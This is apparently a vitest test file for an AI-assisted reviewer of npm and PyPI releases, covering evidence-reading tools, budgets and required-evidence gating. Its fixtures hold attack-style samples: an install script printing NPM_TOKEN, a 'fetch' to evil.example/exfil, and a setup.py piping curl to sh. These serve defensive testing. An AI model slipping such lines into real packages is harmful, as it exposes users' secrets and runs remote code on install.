import { describe, expect, test } from "vitest";
import {
  COVERAGE_READ_CHARS,
  MAX_REQUIRED_EVIDENCE_PATHS,
  MAX_TOOL_RESPONSE_CHARS,
  MAX_TOTAL_TOOL_RESPONSE_CHARS,
  MIN_COVERAGE_READ_SHARE,
} from "../server/lib/ai-review/contract";
import {
  buildAiReviewPayload,
  createAiReviewSession,
  createAiReviewTools,
} from "../server/lib/ai-review/evidence";

const EMPTY_PACKAGE_JSON_DIFF = {
  name: "fixture",
  previousVersion: "1.0.0",
  stagedVersion: "1.0.1",
  scripts: [{ key: "postinstall", status: "added", staged: "node scripts/install" }],
  dependencies: [],
  entrypointsChanged: true,
};

function file(path, textSample) {
  return {
    path,
    size: textSample.length,
    sha256: `sha-${path}`,
    flags: [],
    textSample,
  };
}

function reviewOptions() {
  const packageJson = JSON.stringify(
    {
      name: "fixture",
      version: "1.0.1",
      main: "dist/index.js",
      scripts: { postinstall: "node scripts/install" },
    },
    null,
    2,
  );
  const files = [
    file("package.json", packageJson),
    file("scripts/install.js", "console.log(process.env.NPM_TOKEN);\n"),
    file("dist/index.js", "export const value = 1;\n"),
    file("README.md", "# fixture\n"),
  ];

  return {
    ecosystem: "npm",
    files,
    previousFiles: files,
    diff: [
      {
        path: "package.json",
        status: "modified",
        previousSize: 1,
        stagedSize: packageJson.length,
        previousSha256: "sha-old-package.json",
        stagedSha256: "sha-package.json",
        flags: [],
      },
      {
        path: "scripts/install.js",
        status: "unchanged",
        previousSize: files[1].size,
        stagedSize: files[1].size,
        previousSha256: files[1].sha256,
        stagedSha256: files[1].sha256,
        flags: [],
      },
      {
        path: "dist/index.js",
        status: "unchanged",
        previousSize: files[2].size,
        stagedSize: files[2].size,
        previousSha256: files[2].sha256,
        stagedSha256: files[2].sha256,
        flags: [],
      },
      {
        path: "README.md",
        status: "unchanged",
        previousSize: files[3].size,
        stagedSize: files[3].size,
        previousSha256: files[3].sha256,
        stagedSha256: files[3].sha256,
        flags: [],
      },
    ],
    packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
    ruleFindings: [],
    previousVersionAvailable: true,
  };
}

describe("AI review evidence tools", () => {
  test("allow unchanged files newly referenced by package scripts and entrypoints", async () => {
    const tools = createAiReviewTools(reviewOptions(), () => {});

    const scriptFiles = await tools.list_files.execute({ filter: "scripts" });
    expect(scriptFiles.files.map((entry) => entry.path)).toEqual([
      "package.json",
      "scripts/install.js",
    ]);

    const entrypointFiles = await tools.list_files.execute({ filter: "entrypoints" });
    expect(entrypointFiles.files.map((entry) => entry.path)).toEqual(["dist/index.js"]);

    const reads = await tools.read.execute({
      paths: ["scripts/install.js", "README.md"],
      maxChars: 200,
    });
    expect(reads.ok).toBe(true);
    expect(reads.results).toHaveLength(2);

    const script = reads.results[0];
    expect(script.ok).toBe(true);
    expect(script.status).toBe("unchanged");
    expect(script.kind).toBe("text");
    expect(script.content).toContain("process.env.NPM_TOKEN");

    const readme = reads.results[1];
    expect(readme.ok).toBe(false);
  });

  test("returns a unified diff for changed files when previous text is available", async () => {
    const options = reviewOptions();
    options.previousFiles = options.previousFiles.map((file) =>
      file.path === "package.json" ? { ...file, textSample: '{"name":"fixture"}' } : file,
    );
    const tools = createAiReviewTools(options, () => {});

    const reads = await tools.read.execute({ paths: ["package.json"], maxChars: 4_000 });
    const entry = reads.results[0];
    expect(entry.ok).toBe(true);
    expect(entry.kind).toBe("diff");
    expect(entry.content).toMatch(/^[+\- ]/m);
  });

  test("runs multiple literal searches in one call", async () => {
    const tools = createAiReviewTools(reviewOptions(), () => {});

    const response = await tools.search_files.execute({
      queries: ["NPM_TOKEN", "postinstall"],
      maxResults: 5,
    });
    expect(response.ok).toBe(true);
    expect(response.results.map((entry) => entry.query)).toEqual(["NPM_TOKEN", "postinstall"]);
    const tokenHit = response.results[0];
    expect(tokenHit.ok).toBe(true);
    expect(tokenHit.matches.some((match) => match.path === "scripts/install.js")).toBe(true);
  });

  test("divides the read budget fairly so later batched paths are not starved", async () => {
    const paths = ["a.js", "b.js", "c.js", "d.js"];
    const files = paths.map((path) => file(path, `${path}:`.padEnd(10_000, "x") + "\n"));
    const options = {
      ecosystem: "npm",
      files,
      previousFiles: [],
      diff: paths.map((path, index) => ({
        path,
        status: "added",
        stagedSize: files[index].size,
        stagedSha256: files[index].sha256,
        flags: [],
      })),
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: false,
    };
    const tools = createAiReviewTools(options, () => {});

    const reads = await tools.read.execute({ paths, maxChars: 16_000 });
    expect(reads.results).toHaveLength(4);
    for (const entry of reads.results) {
      expect(entry.ok).toBe(true);
      expect(entry.content.length).toBeGreaterThan(1_000);
    }
  });

  test("trims the initial payload to drop dead input tokens", () => {
    const payload = buildAiReviewPayload(reviewOptions());

    // Tool policy carries only the numeric budgets; the prose duplicated the
    // system prompt and tool descriptions.
    expect(payload.toolPolicy).toEqual({
      maxAgentSteps: expect.any(Number),
      maxToolResponseChars: expect.any(Number),
      maxTotalToolResponseChars: expect.any(Number),
    });
    expect(payload.deterministicRisk).toBe("low");

    // One file list, not two: the diff list is gone and the manifest subsumes it.
    expect(payload).not.toHaveProperty("changedFileDiff");
    expect(payload.changedFileCount).toBe(1);
    expect(payload.changedFileManifest.map((entry) => entry.path)).toEqual(["package.json"]);

    const entry = payload.changedFileManifest[0];
    // SHA256 is input-token noise an LLM can't reason over.
    expect(entry).not.toHaveProperty("sha256");
    // The byte-size delta the diff list carried lives on the manifest entry.
    expect(typeof entry.previousSize).toBe("number");
    expect(typeof entry.stagedSize).toBe("number");
    expect(entry.signals).toContain("diff:modified");

    // The package.json pointer no longer inlines a multi-KB text sample or hash;
    // the model reads it on demand.
    expect(payload.packageJson).not.toHaveProperty("textSample");
    expect(payload.packageJson).not.toHaveProperty("sha256");
  });

  test("elides long unchanged runs so a deep change fits the read budget", async () => {
    const filler = Array.from({ length: 400 }, (_, i) => `const line${i} = ${i};`).join("\n");
    const previousText = `${filler}\nconst tail = true;\n`;
    const stagedText = `${previousText}fetch('https://evil.example/exfil');\n`;
    const options = {
      ecosystem: "npm",
      files: [file("dist/big.js", stagedText)],
      previousFiles: [file("dist/big.js", previousText)],
      diff: [
        {
          path: "dist/big.js",
          status: "modified",
          previousSize: previousText.length,
          stagedSize: stagedText.length,
          previousSha256: "sha-prev",
          stagedSha256: "sha-staged",
          flags: [],
        },
      ],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: true,
    };
    const tools = createAiReviewTools(options, () => {});

    const reads = await tools.read.execute({ paths: ["dist/big.js"], maxChars: 2_000 });
    const entry = reads.results[0];
    expect(entry.ok).toBe(true);
    expect(entry.kind).toBe("diff");
    // The added line sits ~8KB into the file; a 2KB read still reaches it
    // because the unchanged head collapses to an elision marker plus context.
    expect(entry.content).toContain("+fetch('https://evil.example/exfil');");
    expect(entry.content).toMatch(/@@ \d+ unchanged lines @@/);
    expect(entry.content.length).toBeLessThanOrEqual(2_000);
  });

  test("a capped baseline sample carries the note that its diff tail is phantom additions", async () => {
    // The sandbox retains a baseline body only up to its cap, so everything past
    // that point diffs as an addition even where the two versions are identical.
    // The note on the rendered diff is what stops the model from reading those
    // phantom `+` lines as this release's changes.
    const cappedPrevious = "const shared = true;\n";
    const stagedText = `${cappedPrevious}const pastTheCap = 'unchanged in both versions';\n`;
    const buildOptions = (previousFlags) => ({
      ecosystem: "npm",
      files: [file("dist/big.js", stagedText)],
      previousFiles: [{ ...file("dist/big.js", cappedPrevious), flags: previousFlags }],
      diff: [
        {
          path: "dist/big.js",
          status: "modified",
          previousSize: cappedPrevious.length,
          stagedSize: stagedText.length,
          previousSha256: "sha-prev",
          stagedSha256: "sha-staged",
          flags: [],
        },
      ],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: true,
    });
    const tools = createAiReviewTools(buildOptions(["baseline-truncated"]), () => {});

    const reads = await tools.read.execute({ paths: ["dist/big.js"], maxChars: 2_000 });
    const entry = reads.results[0];
    expect(entry.ok).toBe(true);
    expect(entry.kind).toBe("diff");
    // The tail really does render as an addition — that is what the note disarms.
    expect(entry.content).toContain("+const pastTheCap");
    expect(entry.truncated).toBe(true);
    expect(entry.note).toContain(`capped at ${cappedPrevious.length} characters`);
    expect(entry.note).toContain("Judge them against the staged file");

    // The same diff without the retention flag is an ordinary modification: the
    // additions are real and must not be hedged.
    const uncapped = createAiReviewTools(buildOptions([]), () => {});
    const plainReads = await uncapped.read.execute({ paths: ["dist/big.js"], maxChars: 2_000 });
    expect(plainReads.results[0].note).toBeUndefined();
    expect(plainReads.results[0].truncated).toBe(false);
  });

  test("reports the total changed-file count when the manifest is capped", () => {
    const options = reviewOptions();
    options.diff = [
      ...options.diff,
      ...Array.from({ length: 320 }, (_, i) => ({
        path: `src/file-${i}.js`,
        status: "added",
        stagedSize: 10,
        stagedSha256: `sha-${i}`,
        flags: [],
      })),
    ];
    const payload = buildAiReviewPayload(options);

    expect(payload.changedFileCount).toBe(321);
    expect(payload.changedFileManifest).toHaveLength(300);
  });

  test("flags evidence-budget exhaustion so the model submits instead of re-reading", async () => {
    // One file per full read call until the budget is gone, plus one more.
    const count = Math.ceil(MAX_TOTAL_TOOL_RESPONSE_CHARS / MAX_TOOL_RESPONSE_CHARS) + 1;
    const bigFiles = Array.from({ length: count }, (_, i) =>
      file(`f${i}.js`, "x".repeat(MAX_TOOL_RESPONSE_CHARS + 4_000)),
    );
    const options = {
      ecosystem: "npm",
      files: bigFiles,
      previousFiles: [],
      diff: bigFiles.map((entry) => ({
        path: entry.path,
        status: "added",
        stagedSize: entry.size,
        stagedSha256: entry.sha256,
        flags: [],
      })),
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: false,
    };
    const tools = createAiReviewTools(options, () => {});

    const first = await tools.read.execute({ paths: ["f0.js"], maxChars: MAX_TOOL_RESPONSE_CHARS });
    expect(first.note).toBeUndefined();
    let last = first;
    for (let i = 1; i < count - 1; i += 1) {
      last = await tools.read.execute({ paths: [`f${i}.js`], maxChars: MAX_TOOL_RESPONSE_CHARS });
    }
    expect(last.remainingEvidenceChars).toBe(0);
    expect(last.note).toContain("submit_review");

    const exhaustedRead = await tools.read.execute({
      paths: [`f${count - 1}.js`],
      maxChars: MAX_TOOL_RESPONSE_CHARS,
    });
    expect(exhaustedRead.note).toContain("submit_review");
    expect(exhaustedRead.results[0].content).toBe("");
    const exhaustedSearch = await tools.search_files.execute({ queries: ["x"], maxResults: 1 });
    expect(exhaustedSearch.note).toContain("submit_review");
  });

  test("labels PyPI review payloads with the ecosystem-specific task", () => {
    const payload = buildAiReviewPayload({
      ...reviewOptions(),
      ecosystem: "pypi",
      files: [
        file(
          "wheel/py3-none-any/.dist-info/METADATA",
          "Name: fixture\nVersion: 1.0.1\nRequires-Dist: requests\n",
        ),
      ],
      previousFiles: [],
      diff: [
        {
          path: "wheel/py3-none-any/.dist-info/METADATA",
          status: "added",
          stagedSize: 56,
          stagedSha256: "sha-wheel-metadata",
          flags: [],
        },
      ],
      packageJsonDiff: {
        name: "fixture",
        previousVersion: "1.0.0",
        stagedVersion: "1.0.1",
        scripts: [],
        dependencies: [],
        entrypointsChanged: false,
      },
    });

    expect(payload.ecosystem).toBe("pypi");
    expect(payload.task).toContain("PyPI release candidate");
    expect(payload.task).toContain("workflow gate");
    expect(payload.packageJson).toBeNull();

    // An added file has no previous side, so previousSize is omitted from the
    // serialized payload the model actually receives.
    const added = JSON.parse(JSON.stringify(payload)).changedFileManifest[0];
    expect(added.status).toBe("added");
    expect(added).not.toHaveProperty("previousSize");
    expect(added.stagedSize).toBe(53);
  });
});

// Options where the release adds a postinstall that runs an unchanged script,
// ships a native payload, has a deterministic finding, and touches docs.
function coverageOptions() {
  const packageJson = JSON.stringify(
    {
      name: "fixture",
      version: "1.0.1",
      main: "dist/index.js",
      scripts: { postinstall: "node scripts/install" },
    },
    null,
    2,
  );
  const files = [
    file("package.json", packageJson),
    file("scripts/install.js", "console.log(process.env.NPM_TOKEN);\n"),
    file("dist/index.js", "export const value = 1;\n"),
    file("lib/loader.js", "require('./native.node');\n"),
    file("README.md", "# fixture\n"),
    { path: "native.node", size: 10, sha256: "sha-native", flags: ["binary"] },
  ];
  const entry = (path, status) => ({
    path,
    status,
    previousSize: 1,
    stagedSize: 1,
    previousSha256: `old-${path}`,
    stagedSha256: `new-${path}`,
    flags: [],
  });
  return {
    ecosystem: "npm",
    files,
    previousFiles: files.filter((f) => f.path !== "native.node" && f.path !== "lib/loader.js"),
    diff: [
      entry("README.md", "modified"),
      entry("package.json", "modified"),
      entry("scripts/install.js", "unchanged"),
      entry("dist/index.js", "unchanged"),
      entry("lib/loader.js", "added"),
      entry("native.node", "added"),
    ],
    packageJsonDiff: {
      ...EMPTY_PACKAGE_JSON_DIFF,
      scripts: [{ key: "postinstall", status: "added", staged: "node scripts/install" }],
      entrypointsChanged: false,
    },
    ruleFindings: [
      {
        severity: "high",
        file: "lib/loader.js",
        evidence: "require('./native.node')",
        reason: "native load",
        ruleId: "file.native-load",
      },
    ],
    previousVersionAvailable: true,
  };
}

describe("AI review evidence coverage", () => {
  test("names required evidence and orders the manifest by priority, docs last", () => {
    const payload = buildAiReviewPayload(coverageOptions());

    expect(payload.requiredEvidencePaths).toEqual(
      expect.arrayContaining([
        "scripts/install.js",
        "package.json",
        "lib/loader.js",
        "native.node",
      ]),
    );
    expect(payload.requiredEvidencePaths).not.toContain("README.md");
    expect(payload.requiredEvidencePaths).not.toContain("dist/index.js");

    const manifest = payload.changedFileManifest.map((entry) => entry.path);
    expect(manifest.at(-1)).toBe("README.md");
    expect(manifest[0]).not.toBe("README.md");
    const loader = payload.changedFileManifest.find((entry) => entry.path === "lib/loader.js");
    expect(loader.signals).toContain("required-evidence");
  });

  test("requires a changed entrypoint only when the manifest's entrypoints changed", () => {
    const options = coverageOptions();
    expect(buildAiReviewPayload(options).requiredEvidencePaths).not.toContain("dist/index.js");
    options.packageJsonDiff = { ...options.packageJsonDiff, entrypointsChanged: true };
    expect(buildAiReviewPayload(options).requiredEvidencePaths).toContain("dist/index.js");
  });

  test("refuses submit_review until required evidence is read, then records it", async () => {
    const submitted = [];
    const tools = createAiReviewTools(coverageOptions(), (review) => submitted.push(review));
    const review = {
      risk: "low",
      releaseAssessment: "nothing_unusual",
      summary: "fine",
      findings: [],
      requiresManualReview: false,
    };

    const refused = await tools.submit_review.execute(review);
    expect(refused.ok).toBe(false);
    expect(refused.unreadRequiredPaths).toContain("scripts/install.js");
    expect(submitted).toHaveLength(0);

    const reads = await tools.read.execute({ paths: refused.unreadRequiredPaths, maxChars: 2_000 });
    expect(reads.unreadRequiredPaths).toEqual([]);
    // A binary path counts as read even though it returns metadata only.
    expect(reads.results.find((r) => r.path === "native.node").kind).toBe("metadata");

    const recorded = await tools.submit_review.execute(review);
    expect(recorded.ok).toBe(true);
    expect(submitted).toHaveLength(1);
  });

  test("stops refusing after the rejection cap so a stubborn model still lands a review", async () => {
    const submitted = [];
    const tools = createAiReviewTools(coverageOptions(), (review) => submitted.push(review));
    const review = {
      risk: "low",
      releaseAssessment: "nothing_unusual",
      summary: "fine",
      findings: [],
      requiresManualReview: false,
    };
    expect((await tools.submit_review.execute(review)).ok).toBe(false);
    expect((await tools.submit_review.execute(review)).ok).toBe(false);
    expect((await tools.submit_review.execute(review)).ok).toBe(true);
    expect(submitted).toHaveLength(1);
  });

  test("does not refuse when the loop policy lifts the gate", async () => {
    const submitted = [];
    const tools = createAiReviewTools(
      coverageOptions(),
      (review) => submitted.push(review),
      undefined,
      { enforceCoverage: () => false },
    );
    const result = await tools.submit_review.execute({
      risk: "low",
      releaseAssessment: "nothing_unusual",
      summary: "fine",
      findings: [],
      requiresManualReview: false,
    });
    expect(result.ok).toBe(true);
    expect(submitted).toHaveLength(1);
  });

  test("does not refuse once the evidence budget is exhausted", async () => {
    const options = coverageOptions();
    const size = MAX_TOTAL_TOOL_RESPONSE_CHARS + 10_000;
    options.files.push(file("dist/bundle.js", "x".repeat(size)));
    options.diff.push({ path: "dist/bundle.js", status: "added", stagedSize: size, flags: [] });
    const submitted = [];
    const tools = createAiReviewTools(options, (review) => submitted.push(review));
    const before = await tools.read.execute({ paths: ["README.md"], maxChars: 1 });
    expect(before.unreadRequiredPaths.length).toBeGreaterThan(0);
    // Without an offset each read continues where the last one stopped.
    for (let i = 0; i * MAX_TOOL_RESPONSE_CHARS < size; i += 1) {
      await tools.read.execute({ paths: ["dist/bundle.js"], maxChars: MAX_TOOL_RESPONSE_CHARS });
    }
    const exhausted = await tools.read.execute({ paths: ["README.md"], maxChars: 100 });
    expect(exhausted.remainingEvidenceChars).toBe(0);
    // Nothing is owed that the budget can no longer pay for.
    expect(exhausted.unreadRequiredPaths).toEqual([]);

    const result = await tools.submit_review.execute({
      risk: "medium",
      releaseAssessment: "review_recommended",
      summary: "budget gone",
      findings: [],
      requiresManualReview: true,
    });
    expect(result.ok).toBe(true);
    expect(submitted).toHaveLength(1);
  });

  test("continues a cut file from nextOffset", async () => {
    const body = Array.from({ length: 500 }, (_, i) => `line ${i}`).join("\n");
    const options = {
      ecosystem: "npm",
      files: [file("index.js", body)],
      previousFiles: [],
      diff: [{ path: "index.js", status: "added", stagedSize: body.length, flags: [] }],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: false,
    };
    const tools = createAiReviewTools(options, () => {});

    const first = (await tools.read.execute({ paths: ["index.js"], maxChars: 1_000 })).results[0];
    expect(first.offset).toBe(0);
    expect(first.nextOffset).toBe(1_000);
    expect(first.truncated).toBe(true);

    const second = (
      await tools.read.execute({ paths: ["index.js"], maxChars: 1_000, offset: first.nextOffset })
    ).results[0];
    expect(second.offset).toBe(1_000);
    // The two windows tile the rendered text with no overlap or gap.
    const rendered = body
      .split("\n")
      .map((l) => `+${l}`)
      .join("\n");
    expect(first.content + second.content).toBe(rendered.slice(0, 2_000));

    const last = (
      await tools.read.execute({ paths: ["index.js"], maxChars: 16_000, offset: 2_000 })
    ).results[0];
    expect(last.nextOffset).toBeNull();
    expect(last.content).toBe(rendered.slice(2_000));
  });

  test("search walks priority order, caps matches per file, and reports lines", async () => {
    const options = coverageOptions();
    const readme = [
      "# fixture",
      "token one",
      "token two",
      "token three",
      "token four",
      "token five",
    ].join("\n");
    options.files = options.files.map((f) =>
      f.path === "README.md" ? file("README.md", readme) : f,
    );
    options.files = options.files.map((f) =>
      f.path === "scripts/install.js"
        ? file("scripts/install.js", "// a\nconst t = process.env.NPM_TOKEN;\n")
        : f,
    );
    const tools = createAiReviewTools(options, () => {});

    const { results } = await tools.search_files.execute({ queries: ["token"], maxResults: 4 });
    const matches = results[0].matches;
    // The lifecycle script outranks docs, so it is not crowded out by README's
    // five hits even with a result cap of four.
    expect(matches[0].path).toBe("scripts/install.js");
    expect(matches[0].line).toBe(2);
    expect(matches.filter((m) => m.path === "README.md").length).toBeLessThanOrEqual(3);
    expect(matches.find((m) => m.path === "README.md").line).toBe(2);
  });

  test("keeps the lifecycle script in a manifest capped by a huge dist rebuild", () => {
    const chunks = Array.from(
      { length: 320 },
      (_, i) => `dist/chunk-${String(i).padStart(3, "0")}.js`,
    );
    const packageJson = JSON.stringify({
      name: "f",
      version: "2.0.0",
      scripts: { postinstall: "node zz/hook.js" },
    });
    const files = [
      file("package.json", packageJson),
      file("zz/hook.js", "run()\n"),
      ...chunks.map((c) => file(c, "x\n")),
    ];
    const options = {
      ecosystem: "npm",
      files,
      previousFiles: [],
      diff: files.map((f) => ({ path: f.path, status: "added", stagedSize: f.size, flags: [] })),
      packageJsonDiff: {
        ...EMPTY_PACKAGE_JSON_DIFF,
        scripts: [{ key: "postinstall", status: "added", staged: "node zz/hook.js" }],
      },
      ruleFindings: [],
      previousVersionAvailable: false,
    };
    const payload = buildAiReviewPayload(options);
    expect(payload.changedFileCount).toBe(322);
    expect(payload.changedFileManifest).toHaveLength(300);
    // Both outrank every chunk, so the cap drops chunks, never them.
    expect(
      payload.changedFileManifest
        .slice(0, 2)
        .map((e) => e.path)
        .sort(),
    ).toEqual(["package.json", "zz/hook.js"]);
    expect(payload.requiredEvidencePaths.sort()).toEqual(["package.json", "zz/hook.js"]);
  });

  test("a lifecycle hook naming many files cannot evict the entrypoint or payload", () => {
    const options = coverageOptions();
    const decoys = Array.from(
      { length: MAX_REQUIRED_EVIDENCE_PATHS + 10 },
      (_, i) => `tools/d${String(i).padStart(2, "0")}.js`,
    );
    options.files.push(...decoys.map((d) => file(d, "ok\n")));
    options.diff.push(...decoys.map((d) => ({ path: d, status: "unchanged", flags: [] })));
    options.packageJsonDiff = {
      ...options.packageJsonDiff,
      entrypointsChanged: true,
      scripts: [{ key: "postinstall", status: "modified", staged: `node ${decoys.join(" ")}` }],
    };
    const { requiredEvidencePaths } = buildAiReviewPayload(options);
    expect(requiredEvidencePaths).toHaveLength(MAX_REQUIRED_EVIDENCE_PATHS);
    expect(requiredEvidencePaths).toEqual(
      expect.arrayContaining(["package.json", "lib/loader.js", "native.node", "dist/index.js"]),
    );
  });

  test("a changed non-lifecycle script does not make its targets required", () => {
    const options = coverageOptions();
    options.packageJsonDiff = {
      ...options.packageJsonDiff,
      scripts: [{ key: "build", status: "modified", staged: "node scripts/install" }],
    };
    expect(buildAiReviewPayload(options).requiredEvidencePaths).not.toContain("scripts/install.js");
  });

  test("an offset batch is refused and an empty continuation does not count as read", async () => {
    const tools = createAiReviewTools(coverageOptions(), () => {});
    const batch = await tools.read.execute({
      paths: ["package.json", "scripts/install.js"],
      maxChars: 100,
      offset: 5_000,
    });
    expect(batch.ok).toBe(false);
    const empty = await tools.read.execute({
      paths: ["scripts/install.js"],
      maxChars: 100,
      offset: 5_000,
    });
    expect(empty.results[0].content).toBe("");
    expect(empty.unreadRequiredPaths).toContain("scripts/install.js");
    const head = await tools.read.execute({ paths: ["scripts/install.js"], maxChars: 100 });
    expect(head.unreadRequiredPaths).not.toContain("scripts/install.js");
  });

  test("offers no continuation once the evidence budget is exhausted", async () => {
    const options = coverageOptions();
    const size = MAX_TOTAL_TOOL_RESPONSE_CHARS + 4_000;
    options.files.push(file("dist/bundle.js", "x".repeat(size)));
    options.diff.push({ path: "dist/bundle.js", status: "added", stagedSize: size, flags: [] });
    const tools = createAiReviewTools(options, () => {});
    let last;
    for (let offset = 0; offset !== null;) {
      last = (await tools.read.execute({ paths: ["dist/bundle.js"], maxChars: 16_000, offset }))
        .results[0];
      offset = last.nextOffset;
    }
    expect(last.truncated).toBe(true);
    expect(last.nextOffset).toBeNull();
  });
});

describe("AI review coverage read", () => {
  function added(path, text) {
    return { path, status: "added", stagedSize: text.length, flags: [] };
  }

  function addedRelease(entries, extra = {}) {
    const files = entries.map(([path, text]) => file(path, text));
    return {
      ecosystem: "npm",
      files,
      previousFiles: [],
      diff: entries.map(([path, text]) => added(path, text)),
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: false,
      ...extra,
    };
  }

  test("shows every changed file before the first turn, required evidence included", () => {
    const options = coverageOptions();
    const session = createAiReviewSession(options, () => {});
    const calls = session.seedCoverageRead();

    const shown = calls.flatMap((call) => call.output.results.map((result) => result.path));
    // Every changed file plus the unchanged lifecycle target the release reaches.
    expect(shown.sort()).toEqual(
      ["README.md", "lib/loader.js", "native.node", "package.json", "scripts/install.js"].sort(),
    );
    expect(calls.at(-1).output.unreadRequiredPaths).toEqual([]);
    expect(calls[0].toolCallId).toBe("coverage_read_0");

    const coverage = session.coverage();
    expect(coverage.changedFilesFullyShown).toBe(coverage.changedFiles);
    expect(coverage.requiredPathsUnread).toBe(0);
    expect(coverage.coverageReadChars).toBe(coverage.evidenceChars);

    const payload = buildAiReviewPayload(options);
    expect(payload.coverageRead).toEqual({
      shownInFull: 5,
      shownInPart: 0,
      changedFilesNotShown: 0,
    });
    for (const entry of payload.changedFileManifest) {
      expect(entry.signals).toContain("shown:full");
    }
  });

  test("an early submit is accepted once the coverage read has shown the required set", async () => {
    const submitted = [];
    const session = createAiReviewSession(coverageOptions(), (review) => submitted.push(review));
    session.seedCoverageRead();
    const result = await session.tools.submit_review.execute({
      risk: "low",
      releaseAssessment: "nothing_unusual",
      summary: "fine",
      findings: [],
      requiresManualReview: false,
    });
    expect(result.ok).toBe(true);
    expect(submitted).toHaveLength(1);
  });

  test("water-fills a large release: short files whole, long ones cut to one ceiling", () => {
    const entries = [
      ["a-short.js", "short\n"],
      ...Array.from({ length: 20 }, (_, i) => [
        `b-long-${String(i).padStart(2, "0")}.js`,
        "y".repeat(20_000),
      ]),
    ];
    const payload = buildAiReviewPayload(addedRelease(entries));
    const session = createAiReviewSession(addedRelease(entries), () => {});
    const results = session.seedCoverageRead().flatMap((call) => call.output.results);

    const short = results.find((result) => result.path === "a-short.js");
    expect(short.nextOffset).toBeNull();
    const long = results.filter((result) => result.path.startsWith("b-long"));
    expect(long).toHaveLength(20);
    const ceiling = long[0].content.length;
    for (const result of long) {
      expect(result.content.length).toBe(ceiling);
      expect(result.nextOffset).toBe(ceiling);
    }
    expect(session.coverage().coverageReadChars).toBeLessThanOrEqual(COVERAGE_READ_CHARS);
    expect(session.coverage().coverageReadChars).toBeGreaterThan(COVERAGE_READ_CHARS - 20);
    expect(payload.coverageRead).toEqual({
      shownInFull: 1,
      shownInPart: 20,
      changedFilesNotShown: 0,
    });
  });

  test("a huge required file keeps half the budget and the lowest-priority rest drops out", () => {
    const hook = "z".repeat(4 * COVERAGE_READ_CHARS);
    const packageJson = JSON.stringify({ name: "f", scripts: { postinstall: "node hook.js" } });
    const chunks = Array.from({ length: 300 }, (_, i) => [
      `docs/chunk-${String(i).padStart(3, "0")}.md`,
      "w".repeat(2_000),
    ]);
    const options = addedRelease([["package.json", packageJson], ["hook.js", hook], ...chunks], {
      packageJsonDiff: {
        ...EMPTY_PACKAGE_JSON_DIFF,
        scripts: [{ key: "postinstall", status: "added", staged: "node hook.js" }],
      },
    });
    const session = createAiReviewSession(options, () => {});
    const results = session.seedCoverageRead().flatMap((call) => call.output.results);

    const hookShown = results.find((result) => result.path === "hook.js");
    expect(hookShown.content.length).toBeGreaterThanOrEqual(COVERAGE_READ_CHARS / 2 - 100);
    const shownChunks = results.filter((result) => result.path.startsWith("docs/"));
    expect(shownChunks.length).toBeGreaterThan(0);
    expect(shownChunks.length).toBeLessThan(300);
    for (const chunk of shownChunks) {
      expect(chunk.content.length).toBeGreaterThanOrEqual(MIN_COVERAGE_READ_SHARE);
    }
    // Equal priority falls back to path order, so the dropped files are the tail.
    expect(shownChunks.at(-1).path < `docs/chunk-299.md`).toBe(true);
    expect(session.coverage().requiredPathsUnread).toBe(1);
    expect(buildAiReviewPayload(options).coverageRead.changedFilesNotShown).toBe(
      300 - shownChunks.length,
    );
  });

  test("a read without offset continues where the last one stopped", async () => {
    const options = addedRelease([["index.js", "q".repeat(5_000)]]);
    const tools = createAiReviewTools(options, () => {});
    const first = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 })).results[0];
    expect(first.offset).toBe(0);
    const second = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 })).results[0];
    expect(second.offset).toBe(2_000);
    const third = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 })).results[0];
    expect(third.nextOffset).toBeNull();

    const before = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 }))
      .remainingEvidenceChars;
    const again = await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 });
    expect(again.results[0].content).toBe("");
    expect(again.results[0].note).toContain("Already shown in full");
    expect(again.remainingEvidenceChars).toBe(before);
  });

  test("a required file counts only once it has been read to the end", async () => {
    const options = coverageOptions();
    const body = "fetch('https://example.invalid');\n".repeat(400);
    options.files = options.files.map((entry) =>
      entry.path === "scripts/install.js" ? file("scripts/install.js", body) : entry,
    );
    const tools = createAiReviewTools(options, () => {});
    const head = await tools.read.execute({ paths: ["scripts/install.js"], maxChars: 1_000 });
    expect(head.results[0].nextOffset).toBe(1_000);
    expect(head.unreadRequiredPaths).toContain("scripts/install.js");
    // A window past the shown prefix does not count as coverage either.
    const jump = await tools.read.execute({
      paths: ["scripts/install.js"],
      maxChars: 100,
      offset: 9_000,
    });
    expect(jump.unreadRequiredPaths).toContain("scripts/install.js");
    const rest = await tools.read.execute({ paths: ["scripts/install.js"], maxChars: 16_000 });
    expect(rest.results[0].offset).toBe(1_000);
    expect(rest.unreadRequiredPaths).not.toContain("scripts/install.js");
  });

  test("resolves a finding cited under another tree through its alias", async () => {
    const setup = "from setuptools import setup\nimport os\nos.system('curl x | sh')\n";
    const findingFile = "dist/demo-1.2.0.tar.gz/setup.py";
    const options = {
      ecosystem: "pypi",
      files: [file("sdist/PKG-INFO", "Name: demo\n"), file("sdist/setup.py", setup)],
      previousFiles: [],
      diff: [added("sdist/PKG-INFO", "Name: demo\n"), added("sdist/setup.py", setup)],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [
        {
          ruleId: "pypi.setup-install-command",
          severity: "high",
          file: findingFile,
          evidence: "cmdclass",
          reason: "install command",
        },
      ],
      findingPathAliases: { [findingFile]: "sdist/setup.py" },
      previousVersionAvailable: false,
    };
    const payload = buildAiReviewPayload(options);
    expect(payload.requiredEvidencePaths).toEqual(["sdist/setup.py"]);
    const setupEntry = payload.changedFileManifest.find((entry) => entry.path === "sdist/setup.py");
    expect(setupEntry.signals).toContain("deterministic-finding");
    expect(setupEntry.signals).toContain("finding:high");

